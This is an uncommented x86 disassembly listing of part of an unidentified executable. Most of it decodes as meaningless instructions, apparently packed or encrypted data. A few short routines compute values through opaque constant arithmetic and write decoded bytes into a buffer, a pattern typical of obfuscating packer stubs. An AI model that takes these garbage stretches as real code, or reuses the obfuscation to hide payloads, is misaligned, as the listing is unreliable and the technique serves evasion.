  416941:	mov    eax,0x22977a24
  416946:	nop
  416947:	pop    ds
  416948:	pop    eax
  416949:	xchg   ebp,eax
  41694a:	or     esi,DWORD PTR [ebp-0x777a787b]
  416950:	jbe    0x4169a4
  416952:	or     BYTE PTR [edi+ebp*4+0x57299d7c],0x36
  41695a:	xchg   esi,eax
  41695b:	clc    
  41695c:	mov    ds:0x5da4a329,eax
  416961:	sub    eax,0x67c83a6a
  416966:	pop    ecx
  416967:	jmp    0x38fa:0xe977
  41696d:	push   edx
  41696e:	mov    ds:0x703f52f8,eax
  416973:	cvtdq2ps xmm1,XMMWORD PTR [ebp-0x74af01bb]
  41697a:	inc    ebp
  41697b:	adc    BYTE PTR [ebx-0x53f0ebb3],cl
  416981:	enter  0xc102,0xe9
  416985:	add    cl,BYTE PTR [ebx+0x558b104d]
  41698b:	adc    al,0x33
  41698d:	(bad)  
  41698e:	jmp    0x416bee
  416993:	mov    eax,0x2c1e900d
  416998:	sbb    ah,BYTE PTR [esi-0xf757786]
  41699e:	mov    esi,0x6a431796
  4169a3:	stc    
  4169a4:	clc    
  4169a5:	push   ss
  4169a6:	sbb    BYTE PTR [ebx-0x39e7e7ec],bl
  4169ac:	out    0xc8,al
  4169ae:	es ret 
  4169b0:	dec    ebp
  4169b1:	mov    ah,0xc
  4169b3:	push   ebp
  4169b4:	loope  0x4169da
  4169b6:	call   0x97a6:0xa4a670ae
  4169bd:	mov    al,ds:0xc2f71e0c
  4169c2:	pop    ds
  4169c3:	add    al,0x8e
  4169c5:	xchg   esp,eax
  4169c6:	call   0x74b9:0x3aa1b6d0
  4169cd:	push   ebx
  4169ce:	outs   dx,BYTE PTR ds:[esi]
  4169cf:	cmp    eax,0x2a6a7d7d
  4169d4:	xchg   ecx,eax
  4169d5:	inc    ecx
  4169d6:	and    al,0x45
  4169d8:	fiadd  WORD PTR [ecx-0x4628c1f8]
  4169de:	jle    0x416a2a
  4169e0:	imul   ebx,DWORD PTR [edi-0x2fd93488],0x1c
  4169e7:	mov    eax,ds:0xc37146b9
  4169ec:	lods   eax,DWORD PTR ds:[esi]
  4169ed:	jp     0x41699f
  4169ef:	lea    edi,[ebx+edx*1-0x43aad4bc]
  4169f6:	xor    bl,BYTE PTR [esp+ebp*2-0x44]
  4169fa:	mov    bh,0x21
  4169fc:	add    eax,0x7e04f205
  416a01:	sub    al,BYTE PTR [ecx-0x3e8de3b7]
  416a07:	mov    cl,0x84
  416a09:	fs jns 0x4169e7
  416a0c:	push   edx
  416a0d:	jmp    0xf40dcfc8
  416a12:	int3   
  416a13:	push   eax
  416a14:	add    eax,0x9b146094
  416a19:	popa   
  416a1a:	icebp  
  416a1b:	sysenter 
  416a1d:	xchg   ebp,eax
  416a1e:	sbb    dh,dl
  416a20:	add    eax,0x5e51bd6a
  416a25:	adc    ah,0x8f
  416a28:	push   es
  416a29:	int    0xb2
  416a2b:	data16 std 
  416a2d:	stos   DWORD PTR es:[edi],eax
  416a2e:	aas    
  416a2f:	xchg   BYTE PTR [ebp-0x22],bl
  416a32:	pop    esi
  416a33:	inc    eax
  416a34:	xadd   ebp,ebx
  416a37:	xor    ebp,DWORD PTR ds:0x6adc82ef
  416a3d:	shl    DWORD PTR [edx+0x6a],0xf6
  416a41:	xor    edx,0xffffffa8
  416a44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a45:	pop    edi
  416a46:	outs   dx,BYTE PTR ds:[esi]
  416a47:	add    BYTE PTR [ecx-0x12],bl
  416a4a:	dec    eax
  416a4b:	je     0x416aa5
  416a4d:	(bad)  
  416a4f:	shl    ebp,cl
  416a51:	loop   0x416a53
  416a53:	add    DWORD PTR [ebp+0x70f481e2],0x7c
  416a5a:	mov    gs,edi
  416a5c:	inc    esi
  416a5d:	iret   
  416a5e:	ss (bad) 
  416a60:	data16 jbe 0x416a44
  416a63:	jmp    0xa4460226
  416a68:	test   al,0x35
  416a6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a6b:	mov    esp,0x3856ed1a
  416a70:	scas   al,BYTE PTR es:[edi]
  416a71:	cmc    
  416a72:	mov    cl,0x6c
  416a74:	xchg   bh,dh
  416a76:	sub    eax,0xd1952b3d
  416a7b:	ret    
  416a7c:	ret    0x4a13
  416a7f:	add    al,0x34
  416a81:	fcmovnb st,st(4)
  416a83:	mov    esi,esi
  416a85:	mov    dl,0x4f
  416a87:	rcr    BYTE PTR [ecx-0x2b],1
  416a8a:	fimul  DWORD PTR [ecx-0x7e]
  416a8d:	aaa    
  416a8e:	adc    BYTE PTR [ecx+0x4e],bl
  416a91:	sbb    al,dh
  416a93:	out    dx,al
  416a94:	jle    0x416a1c
  416a96:	push   ds
  416a97:	inc    edx
  416a98:	cmc    
  416a99:	sbb    eax,0x666f0e28
  416a9e:	inc    ecx
  416a9f:	jae    0x416a3e
  416aa1:	stos   BYTE PTR es:[edi],al
  416aa2:	clc    
  416aa3:	push   DWORD PTR [ebx]
  416aa5:	hlt    
  416aa6:	cmp    al,BYTE PTR [edx+esi*4+0x43c70d91]
  416aad:	test   al,0xe8
  416aaf:	test   al,0xb6
  416ab1:	or     esi,edx
  416ab3:	jne    0x416acb
  416ab5:	pop    edi
  416ab6:	test   eax,0x49a54558
  416abb:	push   es
  416abc:	jecxz  0x416ab4
  416abe:	sbb    dh,BYTE PTR [esi+0x66bb369]
  416ac4:	jnp    0x416a84
  416ac6:	icebp  
  416ac7:	imul   edi,DWORD PTR [esi-0x18ac44f2],0x50
  416ace:	jnp    0x416b28
  416ad0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ad1:	popf   
  416ad2:	pop    es
  416ad3:	les    edi,FWORD PTR [esi]
  416ad5:	pop    esp
  416ad6:	dec    esi
  416ad7:	ins    DWORD PTR es:[edi],dx
  416ad8:	or     BYTE PTR [ecx+0x7e],bl
  416adb:	push   ds
  416adc:	sub    DWORD PTR [eax],ebp
  416ade:	(bad)  
  416adf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ae0:	(bad)  
  416ae2:	test   bh,dl
  416ae4:	mov    al,ds:0x3e9f7041
  416ae9:	jb     0x416b18
  416aeb:	pop    ebx
  416aec:	enter  0xb9b9,0xf
  416af0:	pop    ebp
  416af1:	sbb    eax,0xa860c9b4
  416af6:	push   ds
  416af7:	and    al,0x7d
  416af9:	push   ebx
  416afa:	int3   
  416afb:	mov    dl,0x5e
  416afd:	ins    BYTE PTR es:[edi],dx
  416afe:	(bad)  ds:[edx]
  416b01:	not    BYTE PTR [ebp+0x51065bef]
  416b07:	xor    eax,0xd5bcd99f
  416b0c:	adc    BYTE PTR [esp+eax*1],ch
  416b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b10:	jns    0x416b59
  416b12:	pop    esp
  416b13:	test   eax,0x63c40da2
  416b18:	shl    BYTE PTR [ebx+0x1ec6a20a],0x16
  416b1f:	out    0x8c,eax
  416b21:	xchg   esi,eax
  416b22:	test   al,0x69
  416b24:	dec    edx
  416b25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b26:	xor    eax,0xba68cb8c
  416b2b:	cmpps  xmm3,XMMWORD PTR [edi],0xb8
  416b2f:	and    eax,0xd4579237
  416b34:	arpl   WORD PTR [ebx],cx
  416b36:	inc    esi
  416b37:	call   FWORD PTR [esi-0x564d0eea]
  416b3d:	fsubr  DWORD PTR [edx+0x5a]
  416b40:	push   cs
  416b41:	fld    QWORD PTR [bx+si-0x68f7]
  416b46:	cli    
  416b47:	popf   
  416b48:	in     al,dx
  416b49:	gs dec edx
  416b4b:	lods   al,BYTE PTR ds:[esi]
  416b4c:	pop    ss
  416b4d:	ds sbb al,0x6e
  416b50:	mov    bh,0xa0
  416b52:	(bad)  
  416b53:	mov    ds:0xdfd226c9,eax
  416b58:	mov    dh,0x92
  416b5a:	mov    ds:0x6ad246ba,eax
  416b5f:	mov    al,ds:0x5c8cd66e
  416b64:	push   ss
  416b65:	sub    DWORD PTR [edi-0x13],0x30
  416b69:	xchg   esp,eax
  416b6a:	shr    DWORD PTR [ecx-0x54],1
  416b6d:	inc    ebx
  416b6e:	std    
  416b6f:	fcmovnb st,st(2)
  416b71:	lock sub edi,DWORD PTR fs:[edi]
  416b75:	cwde   
  416b76:	inc    eax
  416b77:	or     ah,dl
  416b79:	mov    cl,0x3
  416b7b:	pop    esp
  416b7c:	cs call 0xddfc3a12
  416b82:	add    esi,DWORD PTR [edx]
  416b84:	jle    0x416bc5
  416b86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b87:	cli    
  416b88:	loopne 0x416b95
  416b8a:	or     edi,ebp
  416b8c:	push   ds
  416b8d:	adc    ah,BYTE PTR [eax+0x33]
  416b90:	cwde   
  416b91:	jnp    0x416b7c
  416b93:	xchg   DWORD PTR [edi],esp
  416b95:	mov    eax,0xd814e60
  416b9a:	stos   DWORD PTR es:[edi],eax
  416b9b:	and    eax,0xd08fac56
  416ba0:	xchg   ebx,eax
  416ba1:	pusha  
  416ba2:	loopne 0x416b29
  416ba4:	mov    ecx,0x7c795b50
  416ba9:	hlt    
  416baa:	loopne 0x416b4f
  416bac:	in     eax,0x6a
  416bae:	or     eax,DWORD PTR [edi+0x53]
  416bb1:	hlt    
  416bb2:	cmp    ebx,edi
  416bb4:	and    bh,BYTE PTR [eax]
  416bb6:	(bad)
  416bb9:	push   ebp
  416bba:	lea    esi,[eax+0x5f2e1faf]
  416bc0:	(bad)  
  416bc1:	jp     0x416b54
  416bc3:	cdq    
  416bc4:	jmp    0x416c3b
  416bc6:	and    esi,DWORD PTR [ebp+eax*1+0x60]
  416bca:	fstp   DWORD PTR [edx]
  416bcc:	push   ss
  416bcd:	and    al,ah
  416bcf:	xlat   BYTE PTR ds:[ebx]
  416bd0:	jae    0x416bc4
  416bd2:	shl    BYTE PTR [esi+0x9591f4],0x43
  416bd9:	and    al,0xd0
  416bdb:	stos   DWORD PTR es:[edi],eax
  416bdc:	gs mov ecx,0x5ea3ede1
  416be2:	push   ss
  416be3:	fnstcw WORD PTR [edx+edx*1+0x45d64a6]
  416bea:	call   DWORD PTR [ebp+0x10]
  416bed:	pushf  
  416bee:	xor    edx,edx
  416bf0:	or     eax,edx
  416bf2:	add    eax,edi
  416bf4:	push   eax
  416bf5:	shl    ecx,0x1e
  416bf8:	call   0x415231
  416bfd:	mov    eax,DWORD PTR [ebp+0x10]
  416c00:	mov    ecx,DWORD PTR [ebp+0x14]
  416c03:	shrd   eax,ecx,0x2
  416c07:	shr    ecx,0x2
  416c0a:	mov    ecx,DWORD PTR [ebp+0x10]
  416c0d:	mov    edx,DWORD PTR [ebp+0x14]
  416c10:	pop    edi
  416c11:	xor    eax,esi
  416c13:	xor    edx,edx
  416c15:	pop    esi
  416c16:	shl    ecx,0x1e
  416c19:	or     eax,edx
  416c1b:	pop    ebx
  416c1c:	leave  
  416c1d:	ret    0x10
  416c20:	or     eax,eax
  416c22:	mov    eax,DWORD PTR [esp+0x8]
  416c26:	sub    ecx,0x3e9e
  416c2c:	mov    ecx,DWORD PTR [esp+0x10]
  416c30:	or     ecx,eax
  416c32:	mov    DWORD PTR ds:0x42829f,ecx
  416c38:	mov    ecx,DWORD PTR [esp+0xc]
  416c3c:	jne    0x416c55
  416c42:	mov    eax,DWORD PTR [esp+0x4]
  416c46:	xor    DWORD PTR ds:0x4283cb,0x1fc6
  416c50:	mul    ecx
  416c52:	ret    0x10
  416c55:	sub    DWORD PTR ds:0x42827b,0x3993
  416c5f:	push   ebx
  416c60:	sbb    DWORD PTR ds:0x4282f3,0x3efd
  416c6a:	mul    ecx
  416c6c:	add    DWORD PTR ds:0x428353,0x5330
  416c76:	mov    ebx,eax
  416c78:	xor    eax,eax
  416c7a:	add    eax,DWORD PTR ds:0x42823b
  416c80:	mov    eax,DWORD PTR [eax]
  416c82:	adc    DWORD PTR ds:0x42827f,eax
  416c88:	mov    eax,DWORD PTR [esp+0x8]
  416c8c:	mul    DWORD PTR [esp+0x14]
  416c90:	add    ebx,eax
  416c92:	mov    eax,DWORD PTR [esp+0x8]
  416c96:	mul    ecx
  416c98:	add    edx,ebx
  416c9a:	pop    ebx
  416c9b:	ret    0x10
  416c9e:	push   ebp
  416c9f:	mov    ebp,esp
  416ca1:	sub    esp,0x44
  416ca4:	push   ebx
  416ca5:	push   esi
  416ca6:	push   edi
  416ca7:	mov    DWORD PTR [ebp-0x18],0x2
  416cae:	mov    DWORD PTR [ebp-0x14],0x29f0
  416cb5:	mov    DWORD PTR [ebp-0x10],0x3716
  416cbc:	mov    DWORD PTR [ebp-0x2c],0x4e09
  416cc3:	mov    DWORD PTR [ebp-0x28],0x4497
  416cca:	mov    DWORD PTR [ebp-0x24],0x5
  416cd1:	mov    DWORD PTR [ebp-0x20],0x2a0a
  416cd8:	mov    DWORD PTR [ebp-0x1c],0x1
  416cdf:	mov    DWORD PTR [ebp-0xc],0xce6
  416ce6:	mov    DWORD PTR [ebp-0x8],0x12b3
  416ced:	mov    DWORD PTR [ebp-0x4],0xb09
  416cf4:	mov    DWORD PTR [ebp-0x44],0x7617
  416cfb:	mov    DWORD PTR [ebp-0x40],0x721a
  416d02:	mov    DWORD PTR [ebp-0x3c],0x5151
  416d09:	mov    DWORD PTR [ebp-0x38],0x14aa
  416d10:	mov    DWORD PTR [ebp-0x34],0x5a28
  416d17:	mov    DWORD PTR [ebp-0x30],0x19a8
  416d1e:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d21:	mov    eax,DWORD PTR [ebp-0x20]
  416d24:	xor    edx,edx
  416d26:	div    ecx
  416d28:	mov    ecx,DWORD PTR [ebp-0x24]
  416d2b:	xor    edx,edx
  416d2d:	mov    esi,0x1ac5
  416d32:	push   0x20
  416d34:	div    ecx
  416d36:	mov    ecx,DWORD PTR [ebp-0x28]
  416d39:	xor    edx,edx
  416d3b:	xor    eax,0x60dc
  416d40:	sub    eax,ecx
  416d42:	mov    ecx,DWORD PTR [ebp-0x2c]
  416d45:	lea    edi,[eax+ecx*1-0x6300]
  416d4c:	mov    eax,DWORD PTR [ebp-0x4]
  416d4f:	mov    ecx,DWORD PTR [ebp-0x8]
  416d52:	sub    eax,0x7721
  416d57:	xor    eax,ecx
  416d59:	mov    ecx,DWORD PTR [ebp-0xc]
  416d5c:	xor    eax,ecx
  416d5e:	or     eax,0x7bc9
  416d63:	xor    eax,0xfffff0db
  416d68:	mov    ebx,edi
  416d6a:	sub    ebx,eax
  416d6c:	jmp    0x4170a9
  416d71:	dec    ebx
  416d72:	jbe    0x416da1
  416d74:	imul   BYTE PTR [edx+ebp*4]
  416d77:	dec    ebx
  416d78:	sub    dl,dh
  416d7a:	push   0xffffffc1
  416d7c:	mov    al,0x86
  416d7e:	cmp    eax,0xf47abc95
  416d83:	push   ss
  416d84:	sbb    cl,ah
  416d86:	adc    bl,BYTE PTR [eax]
  416d88:	sbb    BYTE PTR [ecx],cl
  416d8a:	iret   
  416d8b:	cli    
  416d8c:	ffreep st(0)
  416d8e:	adc    DWORD PTR [edi-0x67473a93],eax
  416d94:	stos   BYTE PTR es:[edi],al
  416d95:	and    eax,0x5f158391
  416d9a:	pop    ebx
  416d9b:	lahf   
  416d9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d9d:	pop    ds
  416d9e:	adc    ebx,DWORD PTR [ebp+0x4d]
  416da1:	test   BYTE PTR [eax],ah
  416da3:	imul   ebx,edx,0xdbade24f
  416da9:	call   0x8097a2a0
  416dae:	scas   eax,DWORD PTR es:[edi]
  416daf:	push   ebp
  416db0:	jmp    0x416dae
  416db2:	jp     0x416e2f
  416db4:	pop    edx
  416db5:	xchg   ebx,eax
  416db6:	push   edi
  416db7:	mov    al,0xf7
  416db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dba:	inc    esi
  416dbb:	icebp  
  416dbc:	add    al,0xac
  416dbe:	cs push cs
  416dc0:	rcl    DWORD PTR [edi-0x1c],0x8c
  416dc4:	adc    ch,BYTE PTR [ecx-0x31]
  416dc7:	dec    esi
  416dc8:	add    al,0x99
  416dca:	or     DWORD PTR [esi],0x40
  416dcd:	(bad)  
  416dce:	data16 jge 0x416d83
  416dd1:	stos   BYTE PTR es:[edi],al
  416dd2:	js     0x416d8c
  416dd4:	in     al,0xd1
  416dd6:	into   
  416dd7:	or     BYTE PTR [ecx],cl
  416dd9:	or     ch,al
  416ddb:	test   BYTE PTR [esi-0x73],dh
  416dde:	not    dl
  416de0:	mov    bl,0xb0
  416de2:	add    esp,DWORD PTR [ebx]
  416de4:	inc    esi
  416de5:	jecxz  0x416e3a
  416de7:	cs mov edx,0xb9511911
  416ded:	cld    
  416dee:	popa   
  416def:	hlt    
  416df0:	gs xor eax,0x8828c7b
  416df6:	jne    0x416e67
  416df8:	sbb    bh,BYTE PTR [ebx-0xb]
  416dfb:	xor    BYTE PTR [ebx-0x7b9e15a6],0x2
  416e02:	call   0xfe2f:0x4438ffda
  416e09:	adc    eax,0xdb7e5816
  416e0e:	inc    edi
  416e0f:	jg     0x416d9c
  416e11:	mov    ds,edi
  416e13:	push   ebx
  416e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e15:	retf   
  416e16:	jp     0x416df8
  416e18:	inc    ebp
  416e19:	sbb    eax,0xa61967ed
  416e1e:	push   ebx
  416e1f:	cmp    edx,DWORD PTR [eax]
  416e21:	std    
  416e22:	icebp  
  416e23:	jg     0x416dc5
  416e25:	repz xchg ecx,eax
  416e27:	dec    ecx
  416e28:	loopne 0x416e77
  416e2a:	pushf  
  416e2b:	pop    ebx
  416e2c:	fadd   DWORD PTR [eax*2-0x1e7adea]
  416e33:	and    al,0x76
  416e35:	fcmovu st,st(1)
  416e37:	jp     0x416e27
  416e39:	push   edi
  416e3a:	rcl    BYTE PTR [eax],0xad
  416e3d:	pop    edi
  416e3e:	cmp    DWORD PTR [ecx-0x7c87a30a],edx
  416e44:	addr16 inc esp
  416e46:	jl     0x416e75
  416e48:	cdq    
  416e49:	dec    ebp
  416e4a:	mov    edx,0xa5714b49
  416e4f:	and    BYTE PTR [ebx-0x39],dl
  416e52:	push   edi
  416e53:	scas   al,BYTE PTR es:[edi]
  416e54:	adc    dl,BYTE PTR [eax]
  416e56:	adc    ch,BYTE PTR [edx]
  416e58:	adc    al,0x90
  416e5a:	mov    BYTE PTR [ebp-0x1a41702f],ch
  416e60:	loope  0x416de4
  416e62:	fistp  QWORD PTR [ebx+0x13]
  416e65:	and    BYTE PTR [edx+0x253e82b0],dl
  416e6b:	mov    esi,0xb213f4f4
  416e70:	sub    eax,0x30afc04c
  416e75:	sub    eax,0x1d158cf4
  416e7a:	sbb    dh,BYTE PTR [ebp+0x4b28aecc]
  416e80:	add    dh,cl
  416e82:	in     eax,0xa0
  416e84:	xchg   ebx,eax
  416e85:	sub    edx,DWORD PTR [esi]
  416e87:	cmp    BYTE PTR [esi+0x1b],dl
  416e8a:	xchg   esi,eax
  416e8b:	aad    0x11
  416e8d:	dec    ecx
  416e8e:	sbb    edx,DWORD PTR [eax-0x66]
  416e91:	fdiv   DWORD PTR [ecx+0x43e5c9e3]
  416e97:	add    eax,0xb00c2d8c
  416e9c:	or     DWORD PTR [ebp+0x6000d2ae],ebp
  416ea2:	mov    ebx,0x7d22ed5b
  416ea7:	dec    esp
  416ea8:	jne    0x416e2e
  416eaa:	push   es
  416eab:	mov    ah,0x3d
  416ead:	hlt    
  416eae:	fcmovu st,st(0)
  416eb0:	jns    0x416e38
  416eb2:	fmul   QWORD PTR [edx+eax*2]
  416eb5:	fld    DWORD PTR [esi]
  416eb7:	rcr    DWORD PTR [ebp+0x2c],1
  416eba:	sbb    ah,BYTE PTR [ecx-0x3f979d64]
  416ec0:	repnz mov esi,0x8b3974b3
  416ec6:	out    dx,al
  416ec7:	pop    eax
  416ec8:	sahf   
  416ec9:	sbb    al,0x17
  416ecb:	pop    ebp
  416ecc:	inc    si
  416ece:	enter  0x1182,0x9c
  416ed2:	daa    
  416ed3:	imul   esp,eax,0xb9ea791c
  416ed9:	and    DWORD PTR [eax+edi*4],edi
  416edc:	test   BYTE PTR [eax-0x26993dff],bh
  416ee2:	sub    DWORD PTR [esi-0x77],esi
  416ee5:	cmp    BYTE PTR [ecx+0x3d],bh
  416ee8:	push   ebx
  416ee9:	push   ds
  416eea:	es push ebx
  416eec:	jnp    0x416eba
  416eee:	nop
  416eef:	ins    BYTE PTR es:[edi],dx
  416ef0:	(bad)  
  416ef1:	pop    eax
  416ef2:	ins    DWORD PTR es:[edi],dx
  416ef3:	mov    dh,0xf4
  416ef5:	jb     0x416ead
  416ef7:	and    BYTE PTR [ebx+0x7e],bh
  416efa:	mov    esp,0x10bf7f37
  416eff:	lahf   
  416f00:	popf   
  416f01:	adc    bl,cl
  416f03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f04:	pop    edi
  416f05:	push   eax
  416f06:	push   edx
  416f07:	cs xor eax,0x4054bec7
  416f0d:	xor    dl,bh
  416f0f:	neg    DWORD PTR [esi+0xe30940a]
  416f15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f16:	fwait
  416f17:	int3   
  416f18:	lods   eax,DWORD PTR ds:[esi]
  416f19:	fdivr  DWORD PTR [edi+0x26513627]
  416f1f:	xchg   esp,eax
  416f20:	add    BYTE PTR [edi+0x45],0x28
  416f24:	cwde   
  416f25:	and    eax,0x7df1313
  416f2a:	or     cl,BYTE PTR [ebp+0x7f4e9eec]
  416f30:	cmp    eax,0x8b721cbd
  416f35:	add    BYTE PTR [esi+0x7],cl
  416f38:	adc    eax,0xfa0943f
  416f3d:	mov    bl,0xd6
  416f3f:	lahf   
  416f40:	repnz aaa 
  416f42:	lea    edx,[bp+di+0x6d8]
  416f47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f48:	fst    DWORD PTR [ecx+edx*2-0x1f82502c]
  416f4f:	inc    esi
  416f50:	lahf   
  416f51:	push   es
  416f52:	add    eax,0x783f844e
  416f57:	ja     0x416f89
  416f59:	repz push ebp
  416f5b:	and    esp,edi
  416f5d:	adc    eax,0xcf101258
  416f62:	push   eax
  416f63:	aad    0xd4
  416f65:	inc    esi
  416f66:	push   ss
  416f67:	pop    eax
  416f68:	sbb    BYTE PTR [ebx-0x37],ah
  416f6b:	push   cs
  416f6c:	dec    edi
  416f6d:	popa   
  416f6e:	xor    ah,BYTE PTR [edx-0x397b3cba]
  416f74:	xor    DWORD PTR [esi-0x7a9600aa],ebx
  416f7a:	cmp    dh,dl
  416f7c:	jb     0x416f40
  416f7e:	int    0xa5
  416f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f81:	xchg   BYTE PTR [edi],dh
  416f83:	call   0x194c5c51
  416f88:	mov    bh,0x4b
  416f8a:	ficom  DWORD PTR [ebx-0x19]
  416f8d:	sub    BYTE PTR [ebx+0x38],dl
  416f90:	hlt    
  416f91:	cmc    
  416f92:	pop    ebx
  416f93:	inc    edx
  416f94:	ins    BYTE PTR es:[edi],dx
  416f95:	test   DWORD PTR [ecx-0x35f415f],esi
  416f9b:	hlt    
  416f9c:	adc    eax,0xf1a0b9fd
  416fa1:	mov    cs,WORD PTR [ecx]
  416fa3:	lock adc al,0x79
  416fa6:	out    0xc2,al
  416fa8:	and    eax,0x5892c27a
  416fad:	xor    al,0xf8
  416faf:	xor    dh,bl
  416fb1:	sub    al,0x2b
  416fb3:	in     eax,0x59
  416fb5:	inc    eax
  416fb6:	xor    BYTE PTR [edx],dh
  416fb8:	inc    esi
  416fb9:	pop    ds
  416fba:	jnp    0x416f96
  416fbc:	jnp    0x51850299
  416fc2:	xchg   esi,eax
  416fc3:	mov    eax,0xc1f5f4f3
  416fc8:	xor    DWORD PTR [edx-0x3e1b7395],ebx
  416fce:	scas   al,BYTE PTR es:[edi]
  416fcf:	repz mov edi,0x5f743cc9
  416fd5:	retf   0x8213
  416fd8:	push   es
  416fd9:	(bad)  
  416fda:	jmp    0x92fa4d27
  416fdf:	jbe    0x41702e
  416fe1:	pop    ebx
  416fe2:	ins    DWORD PTR es:[edi],dx
  416fe3:	sti    
  416fe4:	hlt    
  416fe5:	test   al,0xda
  416fe7:	ret    
  416fe8:	add    DWORD PTR [ebx],ecx
  416fea:	xchg   edx,eax
  416feb:	mov    ss,WORD PTR [ebx-0x2b]
  416fee:	push   ecx
  416fef:	cmp    DWORD PTR [ebp-0x76],esp
  416ff2:	and    ch,dl
  416ff4:	test   DWORD PTR [eax+0x7e],ebp
  416ff7:	outs   dx,BYTE PTR ds:[esi]
  416ff8:	pushf  
  416ff9:	inc    eax
  416ffa:	fmul   st(7),st
  416ffc:	das    
  416ffd:	das    
  416ffe:	ror    al,cl
  417000:	mov    ebx,0xae1aa89d
  417005:	jecxz  0x416ffd
  417007:	cmp    edi,DWORD PTR [ebp-0x3af098da]
  41700d:	(bad)  
  41700f:	mov    bl,0xf6
  417011:	jge    0x417085
  417013:	mov    ecx,0x55009a41
  417018:	mov    dl,0x52
  41701a:	jno    0x41700d
  41701c:	addr16 test al,0xe4
  41701f:	push   edi
  417020:	test   BYTE PTR [eax+0x6b],bh
  417023:	or     bh,ch
  417025:	cdq    
  417026:	sbb    eax,0xe12c9df2
  41702b:	ret    
  41702c:	pop    ss
  41702d:	shl    bl,0xf
  417030:	cmp    edi,DWORD PTR [ecx]
  417032:	jne    0x417053
  417034:	jmp    0x416ff4
  417036:	fistp  QWORD PTR [eax]
  417038:	popf   
  417039:	(bad)  
  41703a:	fmul   st(1),st
  41703c:	int    0x36
  41703e:	push   edi
  41703f:	fstp   DWORD PTR [ebp-0x1197262a]
  417045:	or     eax,0x55ce2ce2
  41704a:	mov    edi,0xe2a50ca
  41704f:	nop
  417050:	dec    ebx
  417051:	cld    
  417052:	sbb    dl,BYTE PTR [ecx+0x7f]
  417055:	retf   
  417056:	sti    
  417057:	mov    bh,0xe7
  417059:	mov    eax,ds:0x2cdf7d64
  41705e:	fsubr  st(0),st
  417060:	mov    bl,0x63
  417062:	inc    ebx
  417063:	push   ecx
  417064:	out    0x7c,al
  417066:	xchg   esp,eax
  417067:	inc    edi
  417068:	mov    ds:0xeb29a72c,al
  41706d:	cmp    eax,0x5280bfd5
  417072:	jle    0x417075
  417074:	retf   0xefd5
  417077:	adc    DWORD PTR [ebp+0x2d],edx
  41707a:	and    edi,ebx
  41707c:	add    BYTE PTR [edi+0x3f],ch
  41707f:	and    ch,dh
  417081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417082:	nop
  417083:	cs pushf 
  417085:	jmp    0x417077
  417087:	add    cl,al
  417089:	inc    ebx
  41708a:	das    
  41708b:	outs   dx,DWORD PTR ds:[esi]
  41708c:	retf   0xa6c3
  41708f:	mov    bl,0xa7
  417091:	push   ebp
  417092:	test   BYTE PTR [esp+edi*1-0x20],ch
  417096:	not    BYTE PTR [edx+0x4902d41f]
  41709c:	(bad)  
  41709d:	adc    eax,0x3411d684
  4170a2:	cwde   
  4170a3:	pop    eax
  4170a4:	lods   al,BYTE PTR ds:[esi]
  4170a5:	inc    ecx
  4170a6:	loopne 0x417048
  4170a8:	hlt    
  4170a9:	mov    eax,DWORD PTR [ebp-0x10]
  4170ac:	mov    ecx,DWORD PTR [ebp-0x14]
  4170af:	xor    eax,ecx
  4170b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4170b4:	sub    eax,esi
  4170b6:	div    ecx
  4170b8:	mov    ecx,0x211
  4170bd:	pop    edx
  4170be:	xor    eax,ecx
  4170c0:	sub    edx,eax
  4170c2:	cmp    ebx,edx
  4170c4:	ja     0x4174cb
  4170ca:	jmp    0x4170d2
  4170cf:	mov    edi,DWORD PTR [ebp-0x2c]
  4170d2:	mov    DWORD PTR [ebp-0x20],0x1aa3
  4170d9:	mov    DWORD PTR [ebp-0x24],0x52d
  4170e0:	mov    DWORD PTR [ebp-0x28],0x226c
  4170e7:	mov    DWORD PTR [ebp-0x2c],0x347d
  4170ee:	mov    eax,DWORD PTR [ebp-0x2c]
  4170f1:	mov    edx,DWORD PTR [ebp-0x28]
  4170f4:	mov    ebx,DWORD PTR [ebp-0x24]
  4170f7:	sub    eax,0x24b3
  4170fc:	imul   eax,edx
  4170ff:	xor    eax,0x74ef
  417104:	xor    edx,edx
  417106:	div    ebx
  417108:	mov    edx,DWORD PTR [ebp-0x20]
  41710b:	mov    ebx,DWORD PTR [ebp+0x8]
  41710e:	push   0x20
  417110:	and    eax,edx
  417112:	mov    edx,edi
  417114:	sub    edx,eax
  417116:	sub    edx,0x683
  41711c:	mov    DWORD PTR [ebp-0x2c],edx
  41711f:	mov    eax,DWORD PTR [ebp-0x30]
  417122:	mov    edx,DWORD PTR [ebp-0x34]
  417125:	xor    al,dl
  417127:	mov    edx,DWORD PTR [ebp-0x2c]
  41712a:	xor    al,0x58
  41712c:	and    al,0xd8
  41712e:	add    al,BYTE PTR [ebp+0xc]
  417131:	add    al,0x28
  417133:	mov    BYTE PTR [edx+ebx*1],al
  417136:	mov    eax,DWORD PTR [ebp-0x38]
  417139:	add    eax,DWORD PTR [ebp-0x3c]
  41713c:	mov    edx,DWORD PTR [ebp-0x40]
  41713f:	xor    eax,edx
  417141:	mov    edx,DWORD PTR [ebp-0x44]
  417144:	xor    eax,edx
  417146:	mov    edx,0x61f7
  41714b:	sub    edx,eax
  41714d:	mov    eax,DWORD PTR [ebp-0x4]
  417150:	add    edi,edx
  417152:	mov    edx,DWORD PTR [ebp-0x8]
  417155:	sub    eax,0x7721
  41715a:	xor    eax,edx
  41715c:	mov    edx,DWORD PTR [ebp-0xc]
  41715f:	xor    eax,edx
